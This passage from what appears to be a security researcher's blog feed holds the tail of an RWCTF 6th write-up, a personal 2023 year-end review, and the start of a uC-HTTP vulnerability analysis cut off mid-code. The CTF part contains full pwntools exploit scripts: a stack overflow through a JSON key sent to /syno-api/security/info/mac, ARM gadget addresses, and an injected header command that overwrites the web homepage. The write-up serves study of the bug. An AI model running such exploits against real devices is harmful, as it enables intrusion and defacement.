class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">8801</span></span><br><span class="line"></span><br><span class="line">r = remote(ip, port)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a '</span> + <span class="string">b'a'</span> * (<span class="number">0x60</span> + <span class="number">0x24</span>) + <span class="string">b'b'</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">b'""'</span></span><br><span class="line">json = <span class="string">b'{"'</span> + p1 + <span class="string">b'": ""}'</span></span><br><span class="line">li(json)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b'\r\n'</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b''</span></span><br><span class="line">p3 += <span class="string">b'POST /syno-api/security/info/mac HTTP/1.1'</span> + rn</span><br><span class="line">p3 += (<span class="string">b"Content-Length: %d"</span> % <span class="built_in">len</span>(json)) +rn</span><br><span class="line">p3 += <span class="string">b'Host: 127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept: text/plain, */*; q=0.01'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Content-Type: application/json'</span> + rn</span><br><span class="line">p3 += <span class="string">b'X-Requested-With: XMLHttpRequest'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-mobile: ?0'</span> + rn</span><br><span class="line">p3 += <span class="string">b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-platform: "macOS"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Origin: http://127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Site: same-origin'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Mode: cors'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Dest: empty'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Referer: http://127.0.0.1:8801/'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Encoding: gzip, deflate'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Language: zh-CN,zh;q=0.9'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Connection: close'</span> + rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += json</span><br><span class="line"></span><br><span class="line">li(<span class="string">'[+] sendling payload'</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>寻找合适的gadget，符合可见字符，因为aslr为1，最后的利用需要爆破，这里为了方便会关闭aslr。binary_base前面为0x4开头的时候binary里有些地址gadget会符合要求，如下gadget</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00014D5C                 STR             R3, [R11,#var_30]</span><br><span class="line">.text:00014D60                 LDR             R0, [R11,#var_38]</span><br><span class="line">.text:00014D64                 BL              _ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv ; std::string::c_str(void)</span><br><span class="line">.text:00014D68                 MOV             R2, R0</span><br><span class="line">.text:00014D6C                 LDR             R3, =(aR_0 - 0x14D78) ; "r"</span><br><span class="line">.text:00014D70                 ADD             R3, PC, R3 ; "r"</span><br><span class="line">.text:00014D74                 MOV             R1, R3  ; modes</span><br><span class="line">.text:00014D78                 MOV             R0, R2  ; command</span><br></pre></td></tr></tbody></table></figure><p>这里有很多方法来getshell，如果采取rop利用，R11这里的地址刚好在栈上，我尝试之后发现如果使用多个key和value，这些值会往上跑，最后可以跑到r11这里，此时就可以写很长的命令来执行</p><p>还有一种方法是从<code>00014D68</code>这里的地址开始的gadget，此时的寄存器状态如下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*R0   0x7efff1e0 ◂— <span class="string">'aaaaaaaa\\MA'</span></span><br><span class="line"> R1   0x0</span><br><span class="line">*R2   0x7efff1e0 ◂— <span class="string">'aaaaaaaa\\MA'</span></span><br><span class="line">*R3   0x414d5c ◂— mov r2, r0</span><br><span class="line"> R4   0x4b7954 ◂— 0xb77f4</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x407464 ◂— mov fp, <span class="comment">#0</span></span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x4b7954 ◂— 0xb77f4</span><br><span class="line">*R11  0x7efff104 —▸ 0x76fb3840 ◂— mov r3, r0</span><br><span class="line"> R12  0x0</span><br><span class="line">*SP   0x7efff0e8 ◂— 0x0</span><br><span class="line">*PC   0x414d5c ◂— mov r2, r0</span><br></pre></td></tr></tbody></table></figure><p>r0这里可以控制8个字节的命令，最后一个字节用;来隔开进行命令执行，但是在调试的时候发现<code>00014D68</code>这里的地址需要细调，最后的地址为<code>00014D5C</code>，传入自定义的请求头也可以写很长的命令了</p><p>exp如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'arm'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">lg = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\033[32m'</span> + <span class="built_in">str</span>(x) + <span class="string">'\033[0m'</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">8801</span></span><br><span class="line"></span><br><span class="line">r = remote(ip, port)</span><br><span class="line"></span><br><span class="line">binary_base = <span class="number">0x400000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget = 0x14D5c + binary_base</span></span><br><span class="line">gadget = <span class="number">0x14D5c</span> + binary_base</span><br><span class="line"><span class="comment">#gadget = 0x414d5c</span></span><br><span class="line"><span class="comment">#gadget = 0x00018a7c + binary_base</span></span><br><span class="line"><span class="comment">#gadget = 0x14d60 + binary_base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x00018a7c : mov r0, r2 ; blx r3</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b'$HTTP_A'</span></span><br><span class="line">cmd = cmd.ljust(<span class="number">8</span>, <span class="string">b';'</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a '</span> + <span class="string">b'b'</span> * (<span class="number">0x60</span> + <span class="number">0x24</span> - <span class="number">8</span>) + cmd + <span class="string">b'\u005c\u004d\u0041'</span><span class="comment">#p32(gadget)[:3]</span></span><br><span class="line"></span><br><span class="line">value = <span class="string">b'""'</span></span><br><span class="line">json = <span class="string">b'{"'</span> + p1 + <span class="string">b'": ""}'</span></span><br><span class="line">li(json)</span><br><span class="line"></span><br><span class="line">rn = <span class="string">b'\r\n'</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="string">b''</span></span><br><span class="line">p3 += <span class="string">b'POST /syno-api/security/info/mac HTTP/1.1'</span> + rn</span><br><span class="line">p3 += (<span class="string">b"Content-Length: %d"</span> % <span class="built_in">len</span>(json)) +rn</span><br><span class="line">p3 += <span class="string">b'Host: 127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'A: cp /flag /www/index.html'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept: text/plain, */*; q=0.01'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Content-Type: application/json'</span> + rn</span><br><span class="line">p3 += <span class="string">b'X-Requested-With: XMLHttpRequest'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-mobile: ?0'</span> + rn</span><br><span class="line">p3 += <span class="string">b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'</span> + rn</span><br><span class="line">p3 += <span class="string">b'sec-ch-ua-platform: "macOS"'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Origin: http://127.0.0.1:8801'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Site: same-origin'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Mode: cors'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Sec-Fetch-Dest: empty'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Referer: http://127.0.0.1:8801/'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Encoding: gzip, deflate'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Accept-Language: zh-CN,zh;q=0.9'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Cookie: sid=sBmrHHr4XX4TKaIjv0Vw6L3I15y46m47DO9qeF79CPjquIMOAHX6ygmRJ2AaNleg'</span> + rn</span><br><span class="line">p3 += <span class="string">b'Connection: close'</span> + rn</span><br><span class="line">p3 += rn</span><br><span class="line">p3 += json</span><br><span class="line"></span><br><span class="line">li(<span class="string">'[+] sendling payload'</span>)</span><br><span class="line">r.send(p3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>重新访问就可以看到主页被篡改</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://eqqie.cn/index.php/archives/2076">https://eqqie.cn/index.php/archives/2076</a></p><p><a href="https://blog.csdn.net/tuzhutuzhu/article/details/23705485">https://blog.csdn.net/tuzhutuzhu/article/details/23705485</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;RWCTF-6th-Let’s-party-in-the-house&quot;&gt;&lt;a href=&quot;#RWCTF-6th-Let’s-party-in-the-house&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="WP" scheme="https://www.z1r0.top/categories/WP/"/>
    
    
    <category term="RW" scheme="https://www.z1r0.top/tags/RW/"/>
    
  </entry>
  
  <entry>
    <title>2023年终总结</title>
    <link href="https://www.z1r0.top/2023/12/31/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>https://www.z1r0.top/2023/12/31/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-30T17:24:36.000Z</published>
    <updated>2024-01-19T13:46:57.142Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="2023年终总结"><a href="#2023年终总结" class="headerlink" title="2023年终总结"></a>2023年终总结</h1><p>时光如梭，又是一年枯骨暮已低，不知不觉已经到了大四，临近毕业</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今年与星盟安全团队参加了许多的比赛，多的数不过不来了。令我印象最深的线下比赛是今年的强网拟态决赛，这场比赛打的非常煎熬，比赛持续三天，后两天一直在与HAC追逐第一，我们打到第一，过会HAC又追到第一，最后一个小时得知HAC是用实验室的资源在打，确定稳在第二名再加上没有什么思路了，就直接放弃追赶开始休息了，整场比赛打得很累但是很开心。令我印象最深的线上比赛是Real World CTF，当时主要在研究IOT，所以一直在解决ShellFind这题，思路一开始就走歪了，导致后面没有解出来，复现之后感觉也就那样（虽然比赛的时候没有解出来）没有想象中的那么难，在今年安全研究实习之后再回头看发现真的挺简单的</p><p>今年我成长最快、收获最多的阶段是在天工实验室实习，遇见了很多厉害的同事，同事们都非常热情，我与@cynault交流得非常多，在实习的时候这位朋友就住在我的隔壁，最高兴的事情是用上了MAC版ida。在实习过程中，挖到了一些洞，也复现了许多洞，学到了之前从来没有接触过的攻击面。身边的同事可能有些会挖windows的同时，还会挖IOT，挖洞不仅仅局限于单一的方向，同时认识到了自己的逆向分析能力还是需要不断提高。整个学习过程中想的最多的就是：还能这样挖洞？在转正答辩结束后几周就开始摆烂了，现在想过来有点后悔，浪费了很多学习的时间</p><p>临近结束时，跃哥对我说了一句很有意义的话：不复现几百个洞，一些漏洞都不知道是如何形成的，何谈去挖到高质量漏洞，可能看到一个洞都发现不出这是一个漏洞，这样难免有些可惜。在现在这个安全阶段，低级的洞越来越少了，需要不断的去学习来提高自己</p><h2 id="未来研究方向"><a href="#未来研究方向" class="headerlink" title="未来研究方向"></a>未来研究方向</h2><p>今年我做的最多的就是IOT相关的安全研究，我认为IOT是一个非常有意思的方向，我学到了很多IOT的攻击面，所以未来的研究方向主要也是IOT，同时，我还想对windows、一些软件安全研究学习，不断提升自己的实力去打TFC和Pwn2Own</p><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>相比去年，今年稍微有点摆烂了，有很多学习的时间都没有认真去学习，想看的东西都想着后面再看，结果一拖再拖，错失了一些很好的挖洞机会。去年自己定了一些目标，大部分都完成了</p><ul><li>挖到了一些漏洞</li><li>二进制安全研究实习</li><li>学习Fuzz</li><li>打比赛</li></ul><p>还有两件事没有完成，在今年没有拿到win上的CVE，英语没有坚持学习，三天打鱼两天晒网</p><p>希望自己在2024年可以做出以下事情</p><ul><li>能够挖掘出windows上的漏洞</li><li>在IOT方面有高质量漏洞产出</li><li>回归健身</li><li>完成100篇漏洞分析</li><li>坚持打比赛</li><li>坚持学习英语</li><li>一杆清台</li></ul><p>终岁将至，岁月如梭，希望看到这篇文章的你，可以在明年心想事成！</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;2023年终总结&quot;&gt;&lt;a href=&quot;#2023年终总结&quot; class=&quot;headerlink&quot; title=&quot;2023年终总结&quot;&gt;&lt;/a&gt;2023年终总结&lt;/h1&gt;&lt;p&gt;时光如梭，又是一年枯骨暮已低，不知不觉已经</summary>
      
    
    
    
    <category term="年终总结" scheme="https://www.z1r0.top/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="年终总结" scheme="https://www.z1r0.top/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>uC-HTTP漏洞分析</title>
    <link href="https://www.z1r0.top/2023/11/27/uC-HTTP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://www.z1r0.top/2023/11/27/uC-HTTP%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-11-27T08:21:34.000Z</published>
    <updated>2023-12-13T02:17:02.104Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="uC-HTTP漏洞分析"><a href="#uC-HTTP漏洞分析" class="headerlink" title="uC-HTTP漏洞分析"></a>uC-HTTP漏洞分析</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>uC-HTTP 服务器实现设计用于运行 µC/OS II 或 µC/OS III RTOS 内核的嵌入式系统。该 HTTP 服务器支持许多功能，包括持久连接、表单处理、分块传输编码、HTTP 标头字段处理、HTTP 查询字符串处理和动态内容</p><p>uC-HTTP v3.01.01中存在多个漏洞</p><p>下载链接：<a href="https://github.com/weston-embedded/uC-HTTP/archive/refs/tags/v3.01.01.zip">https://github.com/weston-embedded/uC-HTTP/archive/refs/tags/v3.01.01.zip</a></p><p>uC-LIB下载：<a href="https://github.com/weston-embedded/uC-LIB.git">https://github.com/weston-embedded/uC-LIB.git</a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先分析一下http-s_req.c中的HTTPsReq_Handle函数</p><p>这个函数就是一个http的请求处理</p><p>通过一个循环，如果对应的State正确则会对对应的请求字段进行解析</p><p>字段正常解析之后会依次循环解析下一个字段</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>  <span class="title function_">HTTPsReq_Handle</span> <span class="params">(HTTPs_INSTANCE  *p_instance,</span></span><br><span class="line"><span class="params">                       HTTPs_CONN      *p_conn)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    done = DEF_NO;</span><br><span class="line">    <span class="keyword">while</span> (done != DEF_YES) {</span><br><span class="line">        <span class="keyword">switch</span> (p_conn-&gt;State) {</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> HTTPs_CONN_STATE_REQ_INIT:</span><br><span class="line">                 HTTPs_STATS_INC(p_ctr_stats-&gt;Req_StatRxdCtr);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> (HTTPs_CFG_HDR_RX_EN == DEF_ENABLED)</span></span><br><span class="line">                 p_conn-&gt;HdrType = HTTPs_HDR_TYPE_REQ;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                 p_conn-&gt;State   = HTTPs_CONN_STATE_REQ_PARSE_METHOD;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                                                                <span class="comment">/* ---------------- PARSE REQ METHOD ------------------ */</span></span><br><span class="line">            <span class="keyword">case</span> HTTPs_CONN_STATE_REQ_PARSE_METHOD:</span><br><span class="line">                 HTTPsReq_MethodParse(p_instance, p_conn, &amp;err);</span><br><span class="line">                 <span class="keyword">switch</span> (err) {</span><br><span class="line">                     <span class="keyword">case</span> HTTPs_ERR_NONE:                                    <span class="comment">/* If the Method parsing is successful...   */</span></span><br><span class="line">                          p_conn-&gt;State = HTTPs_CONN_STATE_REQ_PARSE_URI;    <span class="comment">/* ...go to the next step.                  */</span></span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">default</span>:                                                <span class="comment">/* If the Method parsing has failed...      */</span></span><br><span class="line">                          HTTPs_ERR_INC(p_ctr_err-&gt;Req_ErrInvalidCtr);       <span class="comment">/* ...generate an error...                  */</span></span><br><span class="line">                          p_conn-&gt;ErrCode   = err;</span><br><span class="line">                          p_conn-&gt;State     = HTTPs_CONN_STATE_ERR_INTERNAL;</span><br><span class="line">                          p_conn-&gt;SockState = HTTPs_SOCK_STATE_NONE;</span><br><span class="line">                          done              = DEF_YES;                       <span class="comment">/* ...and exit the state machine.           */</span></span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                 }</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                                                                <span class="comment">/* ------------------ PARSE REQ URI ------------------- */</span></span><br><span class="line">            <span class="keyword">case</span> HTTPs_CONN_STATE_REQ_PARSE_URI:</span><br><span class="line">                 is_query_str_found = HTTPsReq_URI_Parse(p_instance, p_conn, &amp;err);</span><br><span class="line">                 <span class="keyword">switch</span> (err) {</span><br><span class="line">                     <span class="keyword">case</span> HTTPs_ERR_NONE:                            <span class="comment">/* If the URI parsing is successful...              */</span></span><br><span class="line">                          <span class="keyword">if</span> (is_query_str_found == DEF_YES) {       <span class="comment">/* ...check if query string need to be parse.       */</span></span><br><span class="line">                              p_conn-&gt;State = HTTPs_CONN_STATE_REQ_PARSE_QUERY_STRING;</span><br><span class="line">                          } <span class="keyword">else</span> {</span><br><span class="line">                              p_conn-&gt;State = HTTPs_CONN_STATE_REQ_PARSE_PROTOCOL_VERSION;</span><br><span class="line">                          }</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">case</span> HTTPs_ERR_REQ_MORE_DATA_REQUIRED:          <span class="comment">/* If more data is required to complete the...      */</span></span><br><span class="line">                          p_conn-&gt;SockState = HTTPs_SOCK_STATE_RX;   <span class="comment">/* ...URI Parsing, exit the state machine.          */</span></span><br><span class="line">                          done                = DEF_YES;</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">default</span>:                                        <span class="comment">/* If the URI parsing has failed...                 */</span></span><br><span class="line">                          HTTPs_ERR_INC(p_ctr_err-&gt;Req_ErrInvalidCtr); <span class="comment">/* ...generate an error...                        */</span></span><br><span class="line">                          p_conn-&gt;SockState = HTTPs_SOCK_STATE_NONE;</span><br><span class="line">                          p_conn-&gt;ErrCode   = err;</span><br><span class="line">                          p_conn-&gt;State     = HTTPs_CONN_STATE_ERR_INTERNAL;</span><br><span class="line">                          done              = DEF_YES;               <span class="comment">/* ...and exit the state machine.                   */</span></span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                 }</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                                                                <span class="comment">/* --------------- PARSE REQ QUERY STR ---------------- */</span></span><br><span class="line">            <span class="keyword">case</span> HTTPs_CONN_STATE_REQ_PARSE_QUERY_STRING:</span><br><span class="line">                 HTTPsReq_QueryStrParse(p_instance, p_conn, &amp;err);</span><br><span class="line">                 <span class="keyword">switch</span> (err) {</span><br><span class="line">                     <span class="keyword">case</span> HTTPs_ERR_NONE:                            <span class="comment">/* If the Query Str parsing is successful...        */</span></span><br><span class="line">                                                                     <span class="comment">/* ...go to the next step.                          */</span></span><br><span class="line">                          p_conn-&gt;State = HTTPs_CONN_STATE_REQ_PARSE_PROTOCOL_VERSION;</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">case</span> HTTPs_ERR_REQ_MORE_DATA_REQUIRED:          <span class="comment">/* If more data is required to complete the...      */</span></span><br><span class="line">                          p_conn-&gt;SockState = HTTPs_SOCK_STATE_RX;   <span class="comment">/* ...Query Str Parsing, exit the state machine.    */</span></span><br><span class="line">                          done              = DEF_YES;</span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">default</span>:                                        <span class="comment">/* If the Query Str parsing has failed...           */</span></span><br><span class="line">                          HTTPs_ERR_INC(p_ctr_err-&gt;Req_ErrInvalidCtr); <span class="comment">/* ...generate an error...                        */</span></span><br><span class="line">                          p_conn-&gt;SockState = HTTPs_SOCK_STATE_NONE;</span><br><span class="line">                          p_conn-&gt;ErrCode   = err;</span><br><span class="line">                          p_conn-&gt;State     = HTTPs_CONN_STATE_ERR_INTERNAL;</span><br><span class="line">                          done              = DEF_YES;               <span class="comment">/* ...and exit the state machine.                   */</span></span><br><span class="line">                          <span class="keyword">break</span>;</span><br><span class="line">                 }</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                        